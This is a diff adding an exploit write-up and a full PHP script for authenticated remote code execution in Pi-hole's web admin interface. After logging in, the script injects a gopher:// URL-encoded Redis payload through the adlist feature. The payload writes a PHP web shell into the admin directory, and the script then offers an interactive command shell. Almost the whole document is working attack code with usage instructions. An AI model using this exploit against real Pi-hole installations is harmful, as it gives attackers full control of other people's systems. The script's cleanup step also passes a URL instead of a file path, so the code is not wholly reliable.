@@ -1,0 +1,281 @@
+=============================================================================================================================================
+| # Title     : Pi-hole 5.18.3 via Redis & Gopher Abuse Authenticated Remote Code Execution                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://pi-hole.net/                                                                                                        |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212922/ & 	CVE-2024-34361
+
+[+] Summary    : This PHP script is an authenticated RCE exploit targeting Pi-hole’s web admin interface. 
+                 It requires valid administrator credentials to log in, 
+                 obtain a CSRF token, and abuse the adlist management feature by injecting a crafted gopher:// URL. 
+				 The payload forces the server to interact with a local Redis instance, 
+				 write a malicious PHP file into the admin directory, and ultimately enable arbitrary command execution through a web shell. 
+                 The attack is post-authentication and becomes critical when credentials are compromised, leading to full system control.
+				
+[+] POC : php poc.php https://target.com adminpassword
+	
+<?php
+error_reporting(0);
+
+class PiHoleExploit {
+    private $base_url;
+    private $password;
+    private $session;
+    private $csrf_token;
+    
+    public function __construct($base_url, $password) {
+        $this->base_url = rtrim($base_url, '/');
+        $this->password = $password;
+        $this->session = curl_init();
+        
+        // Configure CURL
+        curl_setopt($this->session, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($this->session, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($this->session, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($this->session, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($this->session, CURLOPT_COOKIEJAR, 'cookies.txt');
+        curl_setopt($this->session, CURLOPT_COOKIEFILE, 'cookies.txt');
+        curl_setopt($this->session, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    }
+    
+    private function http_request($url, $method = 'GET', $data = null, $headers = []) {
+        curl_setopt($this->session, CURLOPT_URL, $url);
+        curl_setopt($this->session, CURLOPT_CUSTOMREQUEST, $method);
+        
+        $default_headers = [
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language: en-US,en;q=0.5',
+            'Connection: keep-alive',
+        ];
+        
+        $all_headers = array_merge($default_headers, $headers);
+        
+        if ($method === 'POST' && $data !== null) {
+            curl_setopt($this->session, CURLOPT_POSTFIELDS, http_build_query($data));
+            $all_headers[] = 'Content-Type: application/x-www-form-urlencoded';
+        }
+        
+        curl_setopt($this->session, CURLOPT_HTTPHEADER, $all_headers);
+        
+        $response = curl_exec($this->session);
+        $http_code = curl_getinfo($this->session, CURLINFO_HTTP_CODE);
+        
+        return [
+            'code' => $http_code,
+            'body' => $response,
+            'headers' => curl_getinfo($this->session, CURLINFO_HEADER_OUT)
+        ];
+    }
+    
+    public function login() {
+        $url = $this->base_url . '/admin/login.php';
+        $data = ['pw' => $this->password];
+        
+        $response = $this->http_request($url, 'POST', $data);
+        
+        if (strpos($response['body'], 'Wrong password') !== false) {
+            echo "[!] Login failed. Incorrect password.\n";
+            return false;
+        }
+        
+        echo "[+] Login successful\n";
+        return true;
+    }
+    
+    private function extract_csrf_token($html) {
+        // Try to find CSRF token in HTML
+        if (preg_match('/<input[^>]*id="token"[^>]*value="([^"]+)"/i', $html, $matches)) {
+            $token = $matches[1];
+        } elseif (preg_match('/<input[^>]*name="token"[^>]*value="([^"]+)"/i', $html, $matches)) {
+            $token = $matches[1];
+        } elseif (preg_match('/"token"\s*:\s*"([^"]+)"/', $html, $matches)) {
+            $token = $matches[1];
+        } else {
+            echo "[!] CSRF token not found\n";
+            return null;
+        }
+        
+        echo "[+] CSRF Token obtained: " . substr($token, 0, 20) . "...\n";
+        return $token;
+    }
+    
+    public function access_adlists() {
+        $url = $this->base_url . '/admin/groups-adlists.php';
+        $response = $this->http_request($url);
+        
+        if ($response['code'] == 200) {
+            $this->csrf_token = $this->extract_csrf_token($response['body']);
+            return $this->csrf_token !== null;
+        } else {
+            echo "[!] Error accessing groups-adlists. Status code: " . $response['code'] . "\n";
+            return false;
+        }
+    }
+    
+    public function add_payload() {
+        if (!$this->csrf_token) {
+            echo "[!] No CSRF token available\n";
+            return false;
+        }
+        
+        $url = $this->base_url . '/admin/scripts/pi-hole/php/groups.php';
+        
+        // Gopher payload for Redis RCE
+        $payload = 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2419%0D%0A/var/www/html/admin%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A';
+        
+        $data = [
+            'action' => 'add_adlist',
+            'address' => $payload,
+            'comment' => '',
+            'token' => $this->csrf_token
+        ];
+        
+        $headers = [
+            'X-Requested-With: XMLHttpRequest',
+            'Accept: application/json, text/javascript, */*; q=0.01',
+            'Origin: ' . $this->base_url,
+            'Referer: ' . $this->base_url . '/admin/groups-adlists.php',
+        ];
+        
+        $response = $this->http_request($url, 'POST', $data, $headers);
+        
+        if ($response['code'] == 200) {
+            echo "[+] Payload sent successfully\n";
+            echo "[+] shell.php should be dropped at /admin/shell.php\n";
+            return true;
+        } else {
+            echo "[!] Failed to send payload. Status code: " . $response['code'] . "\n";
+            return false;
+        }
+    }
+    
+    public function execute_payload() {
+        $url = $this->base_url . '/admin/scripts/pi-hole/php/gravity.sh.php';
+        
+        $headers = [
+            'Accept: text/event-stream',
+            'Cache-Control: no-cache',
+            'Referer: ' . $this->base_url . '/admin/gravity.php',
+        ];
+        
+        $response = $this->http_request($url, 'GET', null, $headers);
+        
+        if ($response['code'] == 200) {
+            echo "[+] Gravity update triggered\n";
+            return true;
+        } else {
+            echo "[!] Failed to trigger gravity update. Status code: " . $response['code'] . "\n";
+            return false;
+        }
+    }
+    
+    public function test_shell() {
+        $url = $this->base_url . '/admin/shell.php?cmd=id';
+        $response = $this->http_request($url);
+        
+        if (strpos($response['body'], 'uid=') !== false) {
+            echo "[+] Shell is working! Command output:\n";
+            echo $response['body'] . "\n";
+            return true;
+        } else {
+            echo "[!] Shell test failed\n";
+            if ($response['code'] == 404) {
+                echo "[!] shell.php not found (404)\n";
+            }
+            return false;
+        }
+    }
+    
+    public function interactive_shell() {
+        echo "\n[+] Entering interactive shell mode\n";
+        echo "[+] Type 'exit' to quit\n\n";
+        
+        while (true) {
+            echo "shell> ";
+            $cmd = trim(fgets(STDIN));
+            
+            if ($cmd === 'exit' || $cmd === 'quit') {
+                break;
+            }
+            
+            if (empty($cmd)) {
+                continue;
+            }
+            
+            $url = $this->base_url . '/admin/shell.php?cmd=' . urlencode($cmd);
+            $response = $this->http_request($url);
+            
+            echo $response['body'] . "\n";
+        }
+    }
+    
+    public function cleanup() {
+        // Remove the shell
+        $url = $this->base_url . '/admin/shell.php?cmd=rm%20-f%20' . urlencode($this->base_url . '/admin/shell.php');
+        $this->http_request($url);
+        echo "[+] Shell cleaned up\n";
+    }
+    
+    public function run() {
+        echo "[*] Starting Pi-hole exploit\n";
+        echo "[*] Target: " . $this->base_url . "\n";
+        
+        if (!$this->login()) {
+            return false;
+        }
+        
+        if (!$this->access_adlists()) {
+            return false;
+        }
+        
+        if (!$this->add_payload()) {
+            return false;
+        }
+        
+        if (!$this->execute_payload()) {
+            return false;
+        }
+        
+        // Wait for gravity update to complete
+        echo "[*] Waiting 5 seconds for gravity update...\n";
+        sleep(5);
+        
+        if ($this->test_shell()) {
+            $this->interactive_shell();
+            $this->cleanup();
+        }
+        
+        return true;
+    }
+    
+    public function __destruct() {
+        if (is_resource($this->session)) {
+            curl_close($this->session);
+        }
+        
+        // Clean up cookie file
+        if (file_exists('cookies.txt')) {
+            unlink('cookies.txt');
+        }
+    }
+}
+
+// Command line interface
+if ($argc < 3) {
+    echo "Usage: php " . basename(__FILE__) . " <base_url> <password>\n";
+    echo "Example: php poc.php https://pihole.example.com admin123\n";
+    exit(1);
+}
+
+$base_url = $argv[1];
+$password = $argv[2];
+
+$exploit = new PiHoleExploit($base_url, $password);
+$exploit->run();
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
